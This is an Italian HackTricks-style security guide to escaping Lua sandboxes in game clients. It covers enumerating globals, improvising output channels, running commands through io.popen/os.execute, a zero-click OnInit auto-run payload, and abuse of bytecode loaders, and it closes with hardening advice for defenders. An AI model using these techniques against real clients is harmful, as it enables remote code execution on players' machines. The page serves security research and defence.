# Bypass dei sandbox Lua (VM incorporate, client di gioco)

{{#include ../../../banners/hacktricks-training.md}}

Questa pagina raccoglie tecniche pratiche per enumerare ed evadere dai "sandbox" Lua incorporati nelle applicazioni (in particolare client di gioco, plugin o motori di scripting in-app). Molti motori espongono un ambiente Lua limitato, ma lasciano raggiungibili globali potenti che consentono l'esecuzione di comandi arbitrari o persino la corruzione della memoria nativa quando i loader di bytecode sono esposti.

Idee principali:
- Considera la VM come un ambiente sconosciuto: enumera _G e scopri quali primitive pericolose sono raggiungibili.
- Quando stdout/print è bloccato, sfrutta qualsiasi canale UI/IPC in-VM come sink di output per osservare i risultati.
- Se io/os è esposto, spesso hai l'esecuzione diretta di comandi (io.popen, os.execute).
- Se load/loadstring/loadfile è esposto, l'esecuzione di bytecode Lua creato ad hoc può compromettere la memory safety in alcune versioni (i verifier ≤5.1 possono essere aggirati; il verifier è stato rimosso nella 5.2), consentendo exploitation avanzate.

## Enumerare l'ambiente sottoposto a sandbox

- Esegui il dump dell'ambiente globale per inventariare tabelle/funzioni raggiungibili:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Se `print()` non è disponibile, riutilizza i canali in-VM. Esempio da una VM di uno script di housing di un MMO, in cui l'output della chat funziona solo dopo una chiamata audio; quanto segue costruisce una funzione di output affidabile:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Generalizza questo pattern per il tuo target: qualsiasi textbox, toast, logger o callback dell'interfaccia utente che accetti stringhe può fungere da stdout per la ricognizione.

## Esecuzione diretta di comandi se io/os è esposto

Se il sandbox espone ancora le librerie standard io o os, probabilmente hai un'immediata esecuzione di comandi:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Note:

- L'esecuzione avviene all'interno del processo client; molti livelli anti-cheat/antidebug che bloccano i debugger esterni non impediranno la creazione di processi nella VM.
- Controlla anche: package.loadlib (caricamento arbitrario di DLL/.so), require con moduli nativi, la ffi di LuaJIT (se presente) e la libreria debug (può elevare i privilegi all'interno della VM).

## Trigger zero-click tramite callback auto-run

Se l'applicazione host invia script ai client e la VM espone hook auto-run (ad esempio, OnInit/OnLoad/OnEnter), inserisci il tuo payload in quel punto per una compromissione drive-by non appena lo script viene caricato:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Qualsiasi callback equivalente (OnLoad, OnEnter, ecc.) generalizza questa tecnica quando gli script vengono trasmessi ed eseguiti automaticamente sul client.

## Primitive pericolose da cercare durante la recon

Durante l'enumerazione di _G, cerca in particolare:
- io, os: io.popen, os.execute, file I/O, accesso all'ambiente.
- load, loadstring, loadfile, dofile: esecuzione di sorgente o bytecode; supporta il caricamento di bytecode non attendibile.
- package, package.loadlib, require: caricamento di librerie dinamiche e superficie dei moduli.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo e hook.
- Solo LuaJIT: ffi.cdef, ffi.load per chiamare direttamente codice nativo.

Esempi di utilizzo minimi (se raggiungibili):

L'API del loader di Lua è cambiata tra le versioni: in Lua 5.1, `load` legge da una reader function e `loadstring` legge da una stringa; `load` di Lua 5.2 accetta una stringa o una reader function, mentre `loadstring` è deprecato in quanto equivalente.<sup>[[5]](#references)[[6]](#references)</sup>
```lua
-- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
local f = load("return 1+1")
print(f()) -- 2

-- Lua 5.1 string/bytecode loader
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## Escalation opzionale: abuso dei bytecode loader di Lua

Quando `load`/`loadstring`/`loadfile` sono raggiungibili, ma `io`/`os` sono limitati, l'esecuzione di bytecode Lua appositamente creato può portare a primitive di divulgazione e corruzione della memoria. Fatti principali:
- Lua ≤ 5.1 includeva un bytecode verifier con bypass noti.<sup>[[4]](#references)</sup>
- Lua 5.2 ha rimosso completamente il verifier (posizione ufficiale: le applicazioni dovrebbero semplicemente rifiutare i chunk precompilati), ampliando la attack surface se il caricamento di bytecode non è vietato.<sup>[[2]](#references)[[3]](#references)</sup>
- I workflow seguono tipicamente questi passaggi: leak di puntatori tramite l'output in-VM, creazione di bytecode per generare confusioni di tipo (ad esempio attorno a FORLOOP o ad altri opcode), quindi pivot verso primitive di lettura/scrittura arbitraria o esecuzione di codice nativo.<sup>[[2]](#references)[[4]](#references)</sup>

Questo percorso è specifico del motore e della versione e richiede RE. Consulta i riferimenti per analisi approfondite, primitive di exploitation ed esempi di gadget nei giochi.

## Note sul rilevamento e sull'hardening (per i difensori)

- Lato server: rifiutare o riscrivere gli script degli utenti; consentire tramite allowlist le API sicure; rimuovere o associare a valori vuoti `io`, `os`, `load`/`loadstring`/`loadfile`/`dofile`, `package.loadlib`, `debug`, `ffi`.
- Lato client: eseguire Lua con un `_ENV` minimale, vietare il caricamento di bytecode, reintrodurre un bytecode verifier rigoroso o controlli delle signature e bloccare la creazione di processi dal processo client.
- Telemetria: generare alert sulla creazione di un child process da parte di gameclient poco dopo il caricamento di uno script; correlare con gli eventi UI/chat/script.

## References

- [1] [Questa casa è infestata: una RCE vecchia di dieci anni nel client di AION (Lua VM per gli alloggi)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Analisi del bytecode: svelare le falle di sicurezza Lua di Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): discussione sulla rimozione del bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Sfruttare il bytecode di Lua 5.1 (gist con bypass/note sul verifier)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
- [5] [Manuale di riferimento di Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
- [6] [Manuale di riferimento di Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
{{#include ../../../banners/hacktricks-training.md}}
